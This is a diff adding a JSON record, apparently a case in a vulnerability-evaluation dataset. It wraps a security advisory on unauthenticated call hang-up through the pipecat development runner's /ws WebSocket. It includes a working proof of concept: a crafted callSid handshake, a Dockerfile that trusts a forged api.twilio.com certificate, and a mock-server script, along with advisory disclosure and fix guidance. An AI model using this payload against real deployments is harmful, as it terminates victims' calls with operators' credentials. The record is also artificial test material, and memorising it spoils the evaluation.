@@ -1,0 +1,202 @@
+{
+  "adjudication": {
+    "admission_output_used": false,
+    "basis": "source_observation",
+    "corpus_v1_evidence_used": false,
+    "corpus_v1_labels_used": false,
+    "corpus_v1_scores_used": false,
+    "detector_output_used": false,
+    "expected_condition_signals": [],
+    "notes": "Partial public-source metadata only; intentionally insufficient as a positive condition.",
+    "ranking_output_used": false,
+    "v6_first_blind_case_errors_used": false,
+    "v6_first_blind_score_used": false
+  },
+  "capture_method": "passive_source_snapshot",
+  "capture_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+  "captured_at": "2026-08-14T18:58:04.423999+00:00",
+  "case_kind": "sparse_noisy",
+  "collector": {
+    "kind": "v7_public_source_literal_draft",
+    "target_contact_performed": false,
+    "third_party_code_executed": false,
+    "version": "1.0.0"
+  },
+  "family": "websocket_authorization",
+  "raw": {
+    "details": {
+      "observation_kind": "partial_public_source_metadata",
+      "source_project": "pipecat-ai/pipecat",
+      "version_boundaries": [
+        {
+          "ecosystem": "pip",
+          "package": "pipecat-ai",
+          "patched_version": ">=1.4.0",
+          "vulnerable_version_range": "<= 0.0.77,<1.4.0"
+        },
+        {
+          "ecosystem": "pip",
+          "package": "pipecat-ai",
+          "patched_version": "1.4.0",
+          "vulnerable_version_range": ">= 0.0.77, < 1.4.0"
+        }
+      ],
+      "version_boundary_count": 2
+    },
+    "method": "UNKNOWN"
+  },
+  "source_project": "pipecat-ai/pipecat",
+  "source_root": "GHSA-j8cv-x86q-rj85",
+  "source_snapshot": {
+    "payload": {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "EQSTLab",
+          "type": "reporter"
+        },
+        {
+          "login": "min8282",
+          "type": "analyst"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/148991397?v=4",
+            "events_url": "https://api.github.com/users/EQSTLab/events{/privacy}",
+            "followers_url": "https://api.github.com/users/EQSTLab/followers",
+            "following_url": "https://api.github.com/users/EQSTLab/following{/other_user}",
+            "gists_url": "https://api.github.com/users/EQSTLab/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/EQSTLab",
+            "id": 148991397,
+            "login": "EQSTLab",
+            "node_id": "U_kgDOCOFtpQ",
+            "organizations_url": "https://api.github.com/users/EQSTLab/orgs",
+            "received_events_url": "https://api.github.com/users/EQSTLab/received_events",
+            "repos_url": "https://api.github.com/users/EQSTLab/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/EQSTLab/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/EQSTLab/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/EQSTLab",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "analyst",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/137873062?v=4",
+            "events_url": "https://api.github.com/users/min8282/events{/privacy}",
+            "followers_url": "https://api.github.com/users/min8282/followers",
+            "following_url": "https://api.github.com/users/min8282/following{/other_user}",
+            "gists_url": "https://api.github.com/users/min8282/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/min8282",
+            "id": 137873062,
+            "login": "min8282",
+            "node_id": "U_kgDOCDfGpg",
+            "organizations_url": "https://api.github.com/users/min8282/orgs",
+            "received_events_url": "https://api.github.com/users/min8282/received_events",
+            "repos_url": "https://api.github.com/users/min8282/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/min8282/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/min8282/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/min8282",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-54695",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-862"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-862",
+          "name": "Missing Authorization"
+        }
+      ],
+      "description": "## Development Runner Telephony WebSocket `/ws` Unauthenticated Call-Control Abuse via Attacker-Supplied Call SID\r\n\r\n### Summary\r\n\r\nThe pipecat development runner registers a `/ws` WebSocket endpoint for telephony testing that accepts connections without any authentication. An unauthenticated remote attacker who can reach an exposed runner endpoint can connect to this endpoint, send a crafted Twilio handshake message containing an attacker-supplied `callSid`, and cause the server to issue an authenticated Twilio REST API hang-up request against that call SID using the server operator's own credentials. This may allow the attacker to forcibly terminate an active call on the victim's Twilio account if the attacker knows or obtains a valid call SID for that account. Equivalent unauthenticated call-control sinks exist for Telnyx and Plivo. Maintainers are evaluating the final CVSS 3.1 score.\r\n\r\n### Details\r\n\r\nThe pipecat development runner registers a WebSocket route at `/ws` (`src/pipecat/runner/run.py:1116`). When a client connects, the server immediately accepts the connection without performing any authentication or signature verification (`run.py:1119`):\r\n\r\n```python\r\nawait websocket.accept()   # run.py:1119 — no auth check before this point\r\n```\r\n\r\nAfter acceptance, the server reads the Twilio WebSocket stream-start handshake and extracts the `callSid` field verbatim from the attacker-controlled JSON payload (`src/pipecat/runner/utils.py:223`):\r\n\r\n```python\r\ncall_id: start_data.get(\"callSid\")   # utils.py:223 — tainted, attacker-supplied\r\n```\r\n\r\nThe tainted `call_id` is then passed directly into `TwilioFrameSerializer` alongside the server's own Twilio account credentials, which are read from environment variables (`src/pipecat/runner/utils.py:513-517`):\r\n\r\n```python\r\nTwilioFrameSerializer(\r\n    stream_sid=stream_id,\r\n    call_sid=call_id,                          # TAINTED\r\n    account_sid=os.getenv(\"TWILIO_ACCOUNT_SID\"),  # server credential\r\n    auth_token=os.getenv(\"TWILIO_AUTH_TOKEN\"),     # server credential\r\n)\r\n```\r\n\r\n`TwilioFrameSerializer` has `auto_hang_up` defaulting to `True` (`src/pipecat/serializers/twilio.py:56`). When the pipeline terminates and serializes an `EndFrame` or `CancelFrame`, `_hang_up_call()` is triggered (`twilio.py:141-147`). This method constructs a Twilio REST API URL containing the attacker-supplied `call_sid` and POSTs to it using the server's own credentials (`twilio.py:196`, `twilio.py:206`):\r\n\r\n```\r\nPOST https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{attacker_call_sid}.json\r\nAuthorization: Basic <base64(account_sid:auth_token)>\r\nBody: Status=completed\r\n```\r\n\r\nThe same unauthenticated call-control pattern exists for Telnyx (`src/pipecat/serializers/telnyx.py:188`, `:195`) and Plivo (`src/pipecat/serializers/plivo.py:180`, `:187`).\r\n\r\nAlthough the runner defaults to `localhost` and is documented as a development runner, its telephony mode is commonly used with a public proxy hostname so that telephony providers can connect inbound calls. If the development runner is exposed to untrusted networks while configured with Twilio, Telnyx, or Plivo credentials, this becomes a realistic network-reachable attack surface.\r\n\r\n### PoC\r\n\r\n**Prerequisites**\r\n\r\n- Docker (for building the isolated PoC image)\r\n- A clone of the pipecat repository at commit `b982b45a7ae1e5ee99e4390ad5a116cdd9b4a8e2` placed at `<context_root>/repo/`\r\n- The files `vuln-001/Dockerfile` and `vuln-001/poc.py` present under `<context_root>/`\r\n\r\n**Step 1 — Build the Docker image**\r\n\r\n```bash\r\ndocker build \\\r\n  -f vuln-001/Dockerfile \\\r\n  -t vuln001-poc \\\r\n  reports/pypiAi_247_pipecat-ai__pipecat\r\n```\r\n\r\nThe Dockerfile installs pipecat from the local repository clone, generates a self-signed TLS CA and server certificate for `api.twilio.com`, and registers that CA in the system trust store so that pipecat's `aiohttp`-based HTTP client accepts the mock server certificate.\r\n\r\n**Step 2 — Run the PoC**\r\n\r\n```bash\r\ndocker run --rm \\\r\n  --add-host api.twilio.com:127.0.0.1 \\\r\n  vuln001-poc\r\n```\r\n\r\nThe `--add-host` flag redirects DNS resolution for `api.twilio.com` to the loopback interface so all outgoing Twilio REST API calls hit the mock server instead of Twilio's real infrastructure.\r\n\r\n**What the PoC does**\r\n\r\n1. Starts a local TLS-enabled HTTP server on `127.0.0.1:443` that impersonates `api.twilio.com` and records every incoming POST request.\r\n2. Simulates the attacker-controlled WebSocket handshake message with an injected `callSid`:\r\n   ```json\r\n   {\"event\": \"start\", \"start\": {\"streamSid\": \"MX000...\", \"callSid\": \"CAATTACKER1337INJECTED00000000001\", \"customParameters\": {}}}\r\n   ```\r\n3. Runs the exact pipecat code path: parses `callSid` from attacker input (`utils.py:223`), constructs `TwilioFrameSerializer` with server credentials (`utils.py:513-517`), and calls `serialize(EndFrame())` which triggers `_hang_up_call()` (`twilio.py:141-147`, `:196`, `:206`).\r\n4. Verifies that the mock server received a POST whose URL contains the attacker-injected call SID.\r\n\r\n**Expected output (passing)**\r\n\r\n```\r\n[PASS] *** VULNERABILITY CONFIRMED ***\r\n[PASS] Attacker callSid 'CAATTACKER1337INJECTED00000000001' appears in Twilio REST API URL.\r\n[PASS] The server used its own credentials (account_sid=ACFAKE000000000000000000000000001)\r\n[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.\r\n```\r\n\r\n**Observed intercepted request (Phase 2 dynamic reproduction)**\r\n\r\n```\r\nPOST https://api.twilio.com/2010-04-01/Accounts/ACFAKE000000000000000000000000001/Calls/CAATTACKER1337INJECTED00000000001.json\r\nAuthorization: Basic QUNGQUtFMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxOmZha2VfYXV0aF90b2tlbl9wb2Nfb25seQ==\r\nBody: Status=completed\r\n```\r\n\r\nDecoding the `Authorization` header confirms `ACFAKE000000000000000000000000001:fake_auth_token_poc_only` — the server's own credentials were used against the attacker-specified call SID.\r\n\r\n### Impact\r\n\r\nThis is a Missing Authorization vulnerability (CWE-862) in the development runner's telephony WebSocket handling. An unauthenticated network actor who can reach an exposed `/ws` WebSocket endpoint of a pipecat development runner configured with Twilio, Telnyx, or Plivo credentials may be able to:\r\n\r\n1. **Forcibly terminate active calls whose valid call-control identifiers are known or obtained** on the server operator's Twilio, Telnyx, or Plivo account by injecting the victim call identifier into the WebSocket handshake and then triggering pipeline termination.\r\n2. **Cause denial of service** against affected calls by repeatedly terminating calls for which the attacker has valid call-control identifiers.\r\n3. **Abuse the operator's telephony provider credentials** to perform call-control actions that the attacker does not have direct access to, effectively escalating privilege over the operator's telephony account.\r\n\r\nImpacted parties include operators who expose the pipecat development runner's telephony `/ws` endpoint on a publicly reachable host with Twilio, Telnyx, or Plivo credentials configured, and their customers whose active calls can be disrupted if a valid call-control identifier is known or obtained by an attacker.\r\n\r\n### Reproduction artifacts\r\n\r\n#### `Dockerfile`\r\n\r\n```dockerfile\r\nFROM python:3.11-slim\r\n\r\nLABEL description=\"VULN-001 PoC: Telephony WebSocket /ws callSid injection (CWE-862)\"\r\n\r\nWORKDIR /poc\r\n\r\n# Install system tools needed for certificate generation and trust management\r\nRUN apt-get update && apt-get install -y \\\r\n    openssl \\\r\n    ca-certificates \\\r\n    && rm -rf /var/lib/apt/lists/*\r\n\r\n# Generate a local CA and a server certificate for api.twilio.com.\r\n# We add the CA to the system trust store so that Python's ssl module\r\n# (used by aiohttp inside TwilioFrameSerializer._hang_up_call) accepts\r\n# our mock HTTPS server at 127.0.0.1:443 as if it were real Twilio.\r\nRUN mkdir -p /poc/certs \\\r\n    # CA private key\r\n    && openssl genrsa -out /poc/certs/ca.key 2048 \\\r\n    # Self-signed CA certificate (1 day is enough for a PoC run)\r\n    && openssl req -new -x509 -days 1 \\\r\n       -key /poc/certs/ca.key \\\r\n       -out /poc/certs/ca.crt \\\r\n       -subj \"/CN=Mock Twilio CA/O=VULN001-PoC/C=US\" \\\r\n    # Server private key\r\n    && openssl genrsa -out /poc/certs/server.key 2048 \\\r\n    # Server CSR — CN must match the hostname pipecat connects to\r\n    && openssl req -new \\\r\n       -key /poc/certs/server.key \\\r\n       -out /poc/certs/server.csr \\\r\n       -subj \"/CN=api.twilio.com/O=Mock Twilio/C=US\" \\\r\n    # SAN extension file (required for modern TLS hostname verification)\r\n    && printf \"[SAN]\\nsubjectAltName=DNS:api.twilio.com\\n\" > /poc/certs/san.cnf \\\r\n    # Sign the server cert with our CA, including the SAN extension\r\n    && openssl x509 -req -days 1 \\\r\n       -in /poc/certs/server.csr \\\r\n       -CA /poc/certs/ca.crt \\\r\n       -CAkey /poc/certs/ca.key \\\r\n       -CAcreateserial \\\r\n       -out /poc/certs/server.crt \\\r\n       -extfile /poc/certs/san.cnf \\\r\n       -extensions SAN \\\r\n    # Add our CA to the Debian system trust store\r\n    && cp /poc/certs/ca.crt /usr/local/share/ca-certificates/mock_twilio_ca.crt \\\r\n    && update-ca-certificates\r\n\r\n# Install pipecat from the cloned repository.\r\n# aiohttp is a pipecat base dependency; it is used inside _hang_up_call().\r\n# numpy and soxr are required for pipecat audio utilities imported at module load.\r\nCOPY repo /pipecat\r\nRUN pip install --no-cache-dir \\\r\n    -e \"/pipecat\" \\\r\n    aiohttp \\\r\n    \"websockets>=11\"\r\n\r\n# Fake Twilio server-side credentials (equivalent to what a real deployment reads from env).\r\n# In a real deployment these are valid account credentials; here they just need to be non-empty\r\n# so TwilioFrameSerializer passes its __init__ validation.\r\nENV TWILIO_ACCOUNT_SID=ACFAKE000000000000000000000000001\r\nENV TWILIO_AUTH_TOKEN=fake_auth_token_poc_only\r\n\r\nCOPY vuln-001/poc.py /poc/poc.py\r\n\r\n# Run the PoC.  The container must be started with --add-host api.twilio.com:127.0.0.1\r\n# so that DNS for api.twilio.com resolves to the local mock server.\r\nCMD [\"python3\", \"/poc/poc.py\"]\r\n```\r\n\r\n#### `poc.py`\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nPoC for VULN-001: Telephony WebSocket /ws unauthenticated call-control abuse\r\nvia attacker-supplied call SID (CWE-862).\r\n\r\nVulnerability summary\r\n---------------------\r\nThe pipecat telephony runner registers a /ws WebSocket endpoint that accepts\r\nconnections without any authentication (run.py:1119).  When a client connects,\r\nthe server parses the Twilio \"start\" handshake message and extracts the callSid\r\nfield verbatim from the attacker-controlled payload (utils.py:223).  That\r\ncallSid is then injected into TwilioFrameSerializer together with the server's\r\nown Twilio credentials read from environment variables (utils.py:513-517).\r\nWhen the pipeline terminates and serializes an EndFrame, _hang_up_call() fires\r\nand issues a Twilio REST API POST with the attacker's callSid in the URL\r\n(twilio.py:196, :206), causing the server to hang up the attacker-specified\r\ncall SID if it identifies a valid call in the server's Twilio account.\r\n\r\nWhat this PoC does\r\n------------------\r\n1. Starts a local HTTPS server on 127.0.0.1:443 that impersonates api.twilio.com\r\n   and records every incoming POST request.  The TLS certificate was generated\r\n   in the Docker build stage and the CA was injected into the system trust store,\r\n   so aiohttp accepts it as legitimate.\r\n2. Ensures /etc/hosts resolves api.twilio.com to 127.0.0.1 so that aiohttp's\r\n   DNS lookup reaches the mock server instead of Twilio's real infrastructure.\r\n3. Reproduces the exact vulnerable code path from pipecat:\r\n     - Parses callSid from attacker-controlled input  (utils.py:223)\r\n     - Creates TwilioFrameSerializer(call_sid=<attacker_value>,\r\n                                     account_sid=TWILIO_ACCOUNT_SID,\r\n                                     auth_token=TWILIO_AUTH_TOKEN)\r\n                                                        (utils.py:513-517)\r\n     - Calls serialize(EndFrame()) which internally invokes _hang_up_call()\r\n                                                        (twilio.py:141-147)\r\n     - _hang_up_call() POSTs to https://api.twilio.com/.../Calls/{callSid}.json\r\n       using server-side Basic Auth credentials       (twilio.py:196, :206)\r\n4. Verifies that the mock server received a POST whose URL contains the\r\n   attacker-injected callSid, providing deterministic observable evidence.\r\n\r\nExpected pass criterion\r\n-----------------------\r\nThe intercepted POST path must contain ATTACKER_CALL_SID.  This proves that\r\nan attacker who connects to /ws and sends a crafted callSid can cause the\r\npipecat server to issue authenticated Twilio REST API calls against the call\r\nSID supplied by the attacker, using the server operator's credentials.\r\n\r\nRequirements\r\n------------\r\n- Run inside the Docker image built from the accompanying Dockerfile.\r\n- Start the container with --add-host api.twilio.com:127.0.0.1, OR run this\r\n  script as root so that /etc/hosts can be written programmatically.\r\n- Port 443 must be available (container runs as root by default).\r\n\"\"\"\r\n\r\nimport asyncio\r\nimport json\r\nimport os\r\nimport ssl\r\nimport sys\r\nimport threading\r\nimport time\r\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\r\nfrom pathlib import Path\r\n\r\n# ---------------------------------------------------------------------------\r\n# Configuration\r\n# ---------------------------------------------------------------------------\r\n\r\n# The callSid the attacker injects into the Twilio WebSocket handshake.\r\n# In a real attack this would need to be the SID of a victim's active call on\r\n# the server operator's Twilio account.\r\nATTACKER_CALL_SID = \"CAATTACKER1337INJECTED00000000001\"\r\n\r\n# Fake Twilio account credentials — in a real deployment these are real and\r\n# are read from environment variables by pipecat (os.getenv).\r\nFAKE_ACCOUNT_SID = os.environ.get(\"TWILIO_ACCOUNT_SID\", \"ACFAKE000000000000000000000000001\")\r\nFAKE_AUTH_TOKEN = os.environ.get(\"TWILIO_AUTH_TOKEN\", \"fake_auth_token_poc_only\")\r\n\r\n# Directory where the Docker build stage generated the TLS certificate pair.\r\nCERTS_DIR = Path(\"/poc/certs\")\r\n\r\n# The mock Twilio HTTPS server listens here.  Must be 443 because pipecat\r\n# hard-codes the Twilio API base URL to https://api.twilio.com (port 443).\r\nMOCK_SERVER_HOST = \"127.0.0.1\"\r\nMOCK_SERVER_PORT = 443\r\n\r\n# ---------------------------------------------------------------------------\r\n# Mock Twilio REST API server\r\n# ---------------------------------------------------------------------------\r\n\r\n# Thread-safe storage for captured requests; set by the handler thread.\r\n_intercepted_requests: list[dict] = []\r\n_request_received = threading.Event()\r\n\r\n\r\nclass MockTwilioAPIHandler(BaseHTTPRequestHandler):\r\n    \"\"\"\r\n    Minimal HTTP handler that records POST requests.\r\n\r\n    pipecat's _hang_up_call() issues exactly one POST request to:\r\n        https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{call_sid}.json\r\n    with Basic Auth (account_sid:auth_token) and body Status=completed.\r\n    This handler captures that request verbatim.\r\n    \"\"\"\r\n\r\n    def do_POST(self) -> None:\r\n        content_length = int(self.headers.get(\"Content-Length\", 0))\r\n        body = self.rfile.read(content_length).decode(\"utf-8\", errors=\"replace\")\r\n\r\n        captured = {\r\n            \"method\": \"POST\",\r\n            \"path\": self.path,\r\n            \"authorization\": self.headers.get(\"Authorization\", \"\"),\r\n            \"body\": body,\r\n        }\r\n        _intercepted_requests.append(captured)\r\n        _request_received.set()\r\n\r\n        print()\r\n        print(\"[MOCK TWILIO] *** Intercepted outgoing Twilio REST API call ***\")\r\n        print(f\"[MOCK TWILIO] POST https://api.twilio.com{self.path}\")\r\n        print(f\"[MOCK TWILIO] Authorization: {captured['authorization']}\")\r\n        print(f\"[MOCK TWILIO] Body: {body}\")\r\n        print()\r\n\r\n        # Respond with a minimal 200 JSON body that satisfies aiohttp's response parsing.\r\n        response_body = json.dumps({\"sid\": \"CA000000000000000000000000000001\",\r\n                                    \"status\": \"completed\"}).encode()\r\n        self.send_response(200)\r\n        self.send_header(\"Content-Type\", \"application/json\")\r\n        self.send_header(\"Content-Length\", str(len(response_body)))\r\n        self.end_headers()\r\n        self.wfile.write(response_body)\r\n\r\n    def log_message(self, fmt: str, *args) -> None:  # type: ignore[override]\r\n        # Suppress the default per-request stderr log line.\r\n        pass\r\n\r\n\r\ndef start_mock_twilio_server() -> HTTPServer:\r\n    \"\"\"\r\n    Start the mock Twilio HTTPS server in a daemon thread.\r\n\r\n    The server uses the TLS certificate generated at Docker build time.\r\n    That certificate is for api.twilio.com and is signed by the mock CA\r\n    that was added to the system trust store via update-ca-certificates,\r\n    so Python's ssl.create_default_context() (used by aiohttp) accepts it.\r\n    \"\"\"\r\n    cert_file = CERTS_DIR / \"server.crt\"\r\n    key_file = CERTS_DIR / \"server.key\"\r\n\r\n    if not cert_file.exists() or not key_file.exists():\r\n        print(f\"[ERROR] TLS certificates not found in {CERTS_DIR}\")\r\n        print(\"[ERROR] Rebuild the Docker image: the Dockerfile generates them at build time.\")\r\n        sys.exit(1)\r\n\r\n    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\r\n    ssl_ctx.load_cert_chain(str(cert_file), str(key_file))\r\n\r\n    server = HTTPServer((MOCK_SERVER_HOST, MOCK_SERVER_PORT), MockTwilioAPIHandler)\r\n    server.socket = ssl_ctx.wrap_socket(server.socket, server_side=True)\r\n\r\n    thread = threading.Thread(target=server.serve_forever, daemon=True)\r\n    thread.start()\r\n    return server\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# /etc/hosts redirect\r\n# ---------------------------------------------------------------------------\r\n\r\ndef ensure_hosts_redirect() -> None:\r\n    \"\"\"\r\n    Ensure api.twilio.com resolves to 127.0.0.1 in /etc/hosts.\r\n\r\n    Preferred: pass --add-host api.twilio.com:127.0.0.1 to docker run.\r\n    Fallback: write directly (requires root, which is the default in Docker).\r\n    \"\"\"\r\n    hosts_path = Path(\"/etc/hosts\")\r\n    content = hosts_path.read_text()\r\n    if \"api.twilio.com\" in content:\r\n        print(\"[+] /etc/hosts already contains api.twilio.com -> 127.0.0.1\")\r\n        return\r\n    try:\r\n        with open(hosts_path, \"a\") as fh:\r\n            fh.write(\"\\n127.0.0.1 api.twilio.com\\n\")\r\n        print(\"[+] Wrote api.twilio.com -> 127.0.0.1 into /etc/hosts\")\r\n    except PermissionError:\r\n        print(\"[WARN] Cannot write /etc/hosts — start container with\"\r\n              \" --add-host api.twilio.com:127.0.0.1\")\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Core attack reproduction using pipecat's actual code\r\n# ---------------------------------------------------------------------------\r\n\r\nasync def reproduce_attack() -> None:\r\n    \"\"\"\r\n    Reproduce the vulnerable pipecat code path step by step.\r\n\r\n    This function uses the real pipecat library (installed from the cloned\r\n    repository) and does NOT modify any source files.  The objective is to\r\n    show that pipecat's own code, given attacker-controlled input on /ws,\r\n    will issue an authenticated Twilio REST API call against the injected\r\n    callSid.\r\n    \"\"\"\r\n    # Import pipecat's actual serializer and frame types.\r\n    from pipecat.serializers.twilio import TwilioFrameSerializer\r\n    from pipecat.frames.frames import EndFrame\r\n\r\n    print()\r\n    print(\"=\" * 65)\r\n    print(\"Step 1 — Attacker-supplied WebSocket handshake (no auth check)\")\r\n    print(\"=\" * 65)\r\n    # This is what the attacker sends to /ws after the server calls\r\n    # await websocket.accept()  (run.py:1119 — no prior auth check).\r\n    attacker_ws_message = {\r\n        \"event\": \"start\",\r\n        \"start\": {\r\n            \"streamSid\": \"MX00000000000000000000000000000000\",\r\n            \"callSid\": ATTACKER_CALL_SID,   # <-- attacker-controlled\r\n            \"customParameters\": {}\r\n        }\r\n    }\r\n    print(f\"Attacker sends: {json.dumps(attacker_ws_message)}\")\r\n\r\n    print()\r\n    print(\"=\" * 65)\r\n    print(\"Step 2 — pipecat parses callSid from attacker message\")\r\n    print(\"         (mirrors utils.py:218-230)\")\r\n    print(\"=\" * 65)\r\n    # Reproduction of utils.py:219-230\r\n    start_data = attacker_ws_message[\"start\"]\r\n    call_id = start_data.get(\"callSid\")      # utils.py:223 — tainted value\r\n    stream_id = start_data.get(\"streamSid\")\r\n    print(f\"Parsed call_id (attacker-controlled): {call_id}\")\r\n    print(f\"Parsed stream_id:                     {stream_id}\")\r\n\r\n    print()\r\n    print(\"=\" * 65)\r\n    print(\"Step 3 — TwilioFrameSerializer created with attacker callSid\")\r\n    print(\"         + server-side Twilio credentials (utils.py:513-517)\")\r\n    print(\"=\" * 65)\r\n    print(f\"  call_sid    = {call_id!r}   [TAINTED: from attacker]\")\r\n    print(f\"  account_sid = {FAKE_ACCOUNT_SID!r}   [from TWILIO_ACCOUNT_SID env var]\")\r\n    print(f\"  auth_token  = {FAKE_AUTH_TOKEN[:8]!r}...   [from TWILIO_AUTH_TOKEN env var]\")\r\n\r\n    # This is the exact code at utils.py:513-517.\r\n    serializer = TwilioFrameSerializer(\r\n        stream_sid=stream_id,\r\n        call_sid=call_id,             # TAINTED — attacker-supplied\r\n        account_sid=FAKE_ACCOUNT_SID, # server credential\r\n        auth_token=FAKE_AUTH_TOKEN,   # server credential\r\n    )\r\n\r\n    print()\r\n    print(\"=\" * 65)\r\n    print(\"Step 4 — Pipeline ends: serialize(EndFrame()) triggers _hang_up_call()\")\r\n    print(\"         (twilio.py:141-147 -> twilio.py:196, :206)\")\r\n    print(\"=\" * 65)\r\n    print(\"Calling serializer.serialize(EndFrame()) ...\")\r\n    print(f\"Expected Twilio API URL:\")\r\n    print(f\"  https://api.twilio.com/2010-04-01/Accounts/{FAKE_ACCOUNT_SID}\"\r\n          f\"/Calls/{call_id}.json\")\r\n    print(\"(api.twilio.com resolves to 127.0.0.1 — intercepted by mock server)\")\r\n\r\n    # This line reproduces twilio.py:141-147 -> _hang_up_call().\r\n    # aiohttp will POST to api.twilio.com which /etc/hosts redirects to\r\n    # our mock HTTPS server.  The mock server logs the request including\r\n    # the attacker-injected callSid in the URL.\r\n    await serializer.serialize(EndFrame())\r\n\r\n    print(\"serialize(EndFrame()) returned — API POST dispatched.\")\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Entry point\r\n# ---------------------------------------------------------------------------\r\n\r\nasync def main() -> bool:\r\n    print()\r\n    print(\"=\" * 65)\r\n    print(\"VULN-001 PoC — Telephony WebSocket callSid Injection\")\r\n    print(\"CWE-862: Missing Authorization\")\r\n    print(\"pipecat-ai/pipecat @ commit b982b45\")\r\n    print(\"=\" * 65)\r\n\r\n    # 1. Redirect api.twilio.com to localhost\r\n    ensure_hosts_redirect()\r\n\r\n    # 2. Start the mock Twilio HTTPS server\r\n    print(\"[*] Starting mock Twilio REST API server on 127.0.0.1:443 ...\")\r\n    start_mock_twilio_server()\r\n    time.sleep(0.3)  # Let the server thread bind and start accepting.\r\n    print(\"[+] Mock server ready.\")\r\n\r\n    # 3. Reproduce the attack using pipecat's own code\r\n    try:\r\n        await reproduce_attack()\r\n    except Exception as exc:\r\n        print(f\"\\n[ERROR] Attack reproduction raised an exception: {exc}\")\r\n        import traceback\r\n        traceback.print_exc()\r\n        return False\r\n\r\n    # 4. Wait for the mock server to record the intercepted request\r\n    print()\r\n    print(\"[*] Waiting for mock Twilio server to receive POST request (timeout 10 s) ...\")\r\n    received = _request_received.wait(timeout=10.0)\r\n\r\n    # 5. Evaluate evidence\r\n    print()\r\n    print(\"=\" * 65)\r\n    print(\"EVIDENCE EVALUATION\")\r\n    print(\"=\" * 65)\r\n\r\n    if not received or not _intercepted_requests:\r\n        print(\"[FAIL] Mock Twilio server received no requests within 10 seconds.\")\r\n        print(\"       Likely causes:\")\r\n        print(\"       - api.twilio.com /etc/hosts entry missing or wrong\")\r\n        print(\"       - Port 443 could not be bound (need root)\")\r\n        print(\"       - CA certificate not added to system trust store\")\r\n        return False\r\n\r\n    req = _intercepted_requests[0]\r\n    path = req[\"path\"]\r\n    auth = req[\"authorization\"]\r\n    body = req[\"body\"]\r\n\r\n    print(f\"Intercepted POST:\")\r\n    print(f\"  URL:           https://api.twilio.com{path}\")\r\n    print(f\"  Authorization: {auth}\")\r\n    print(f\"  Body:          {body}\")\r\n\r\n    expected_fragment = f\"/Calls/{ATTACKER_CALL_SID}.json\"\r\n    if expected_fragment in path:\r\n        print()\r\n        print(\"[PASS] *** VULNERABILITY CONFIRMED ***\")\r\n        print(f\"[PASS] Attacker callSid '{ATTACKER_CALL_SID}' appears in Twilio REST API URL.\")\r\n        print(f\"[PASS] The server used its own credentials (account_sid={FAKE_ACCOUNT_SID})\")\r\n        print(f\"[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.\")\r\n        print(f\"[PASS] In a real deployment this terminates the call if the SID identifies an active call\")\r\n        print(f\"[PASS] in the server operator's Twilio account.\")\r\n        return True\r\n    else:\r\n        print()\r\n        print(f\"[FAIL] Expected callSid not found in intercepted path: {path}\")\r\n        return False\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    success = asyncio.run(main())\r\n    sys.exit(0 if success else 1)\r\n```\r\n\r\n### Resolution\r\n\r\nThis issue was addressed in pipecat-ai `v1.4.0` by adding optional HMAC token authentication for development-runner WebSocket endpoints.\r\n\r\nOperators who expose the development runner’s WebSocket endpoints to anything other than localhost should upgrade to `v1.4.0` or later and enable WebSocket token authentication:\r\n\r\n```bash\r\nPIPECAT_WEBSOCKET_AUTH=token\r\n```\r\n\r\nor:\r\n\r\n```bash\r\npython bot.py -t twilio --ws-auth token\r\npython bot.py -t websocket --ws-auth token\r\n```\r\n\r\nWhen enabled, clients must first call `POST /start` to obtain a short-lived, one-time-use signed token before connecting to `/ws` or `/ws-client`. Tokens may be supplied via\r\n`Authorization: Bearer <token>`, `?token=<token>`, or as a path segment such as `/ws/<token>`, which is intended for telephony providers that cannot set custom headers. Invalid,\r\nexpired, or replayed tokens are rejected with WebSocket close code `4003`.\r\n\r\nThe fix was merged in https://github.com/pipecat-ai/pipecat/pull/4660.",
+      "ghsa_id": "GHSA-j8cv-x86q-rj85",
+      "html_url": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-j8cv-x86q-rj85"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-54695"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-06-17T14:39:37Z",
+      "publisher": {
